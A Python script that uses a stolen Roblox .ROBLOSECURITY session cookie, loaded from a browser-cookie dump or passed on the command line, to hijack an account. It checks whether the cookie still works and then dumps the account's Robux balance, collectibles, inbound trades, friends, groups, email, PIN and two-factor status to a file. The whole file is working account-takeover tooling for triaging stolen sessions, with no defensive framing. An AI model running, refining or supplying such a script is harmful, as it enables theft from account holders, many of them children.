#!/usr/bin/env python3
"""
roblox_api.py — Roblox session operations using extracted .ROBLOSECURITY cookie
usage:
    python roblox_api.py --cookies cookies.json
    python roblox_api.py --cookie ".ROBLOSECURITY_VALUE"
"""
import argparse, json, sys, os
import requests

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " \
     "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


def load_cookie(path):
    with open(path) as f:
        d = json.load(f)
    for c in d.get("cookies", []):
        if c.get("name") == ".ROBLOSECURITY" and "roblox.com" in c.get("host", ""):
            return c["value"]
    return None


def make_session(cookie):
    s = requests.Session()
    s.headers.update({"User-Agent": UA})
    s.cookies.set(".ROBLOSECURITY", cookie, domain=".roblox.com")
    return s


def api(s, url, method="GET", **kw):
    try:
        r = s.request(method, url, timeout=20, **kw)
        return r.status_code, r.json() if r.text else None
    except Exception as e:
        return 0, {"error": str(e)}


def dump_account(s, uid):
    out = {}

    # auth check
    code, auth = api(s, "https://users.roblox.com/v1/users/authenticated")
    out["auth"] = auth

    # profile
    code, info = api(s, f"https://users.roblox.com/v1/users/{uid}")
    out["profile"] = info

    # robux balance
    code, robux = api(s, "https://economy.roblox.com/v1/user/currency")
    out["robux"] = robux

    # friends
    code, friends = api(s, f"https://friends.roblox.com/v1/users/{uid}/friends")
    out["friends_count"] = len(friends.get("data", [])) if friends else 0
    out["friends"] = friends

    # groups
    code, groups = api(s, f"https://groups.roblox.com/v1/users/{uid}/groups/roles")
    out["groups"] = groups

    # inventory — collectibles
    code, inv = api(s, f"https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100")
    out["collectibles"] = inv

    # trades
    code, trades = api(s, f"https://trades.roblox.com/v1/trades/inbound?limit=100")
    out["inbound_trades"] = trades

    # email status
    code, email = api(s, "https://accountsettings.roblox.com/v1/email")
    out["email"] = email

    # pin status
    code, pin = api(s, "https://auth.roblox.com/v1/account/pin")
    out["pin_status"] = pin

    # 2FA status
    code, tfa = api(s, "https://twostepverification.roblox.com/v1/users/me/configuration")
    out["twofa"] = tfa

    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--cookies", default="cookies.json")
    ap.add_argument("--cookie")
    ap.add_argument("--out", default="roblox_dump.json")
    args = ap.parse_args()

    cookie = args.cookie or load_cookie(args.cookies)
    if not cookie:
        print("[!] no cookie", file=sys.stderr); sys.exit(1)

    s = make_session(cookie)
    code, auth = api(s, "https://users.roblox.com/v1/users/authenticated")
    if code != 200 or not auth or "id" not in auth:
        print(f"[!] cookie dead or rejected: {auth}", file=sys.stderr); sys.exit(2)

    uid = auth["id"]
    print(f"[+] authenticated: {auth.get('name')} (id {uid}, display {auth.get('displayName')})")

    dump = dump_account(s, uid)
    with open(args.out, "w") as f:
        json.dump(dump, f, indent=2)
    print(f"[+] wrote {args.out}")

    # print summary
    print(f"[*] robux: {dump.get('robux', {}).get('robux')}")
    print(f"[*] friends: {dump.get('friends_count')}")
    print(f"[*] groups: {len(dump.get('groups', {}).get('data', []))}")
    print(f"[*] email set: {'yes' if dump.get('email', {}).get('emailAddress') else 'no'}")
    print(f"[*] pin set: {dump.get('pin_status')}")
    print(f"[*] 2fa: {dump.get('twofa')}")


if __name__ == "__main__":
    main()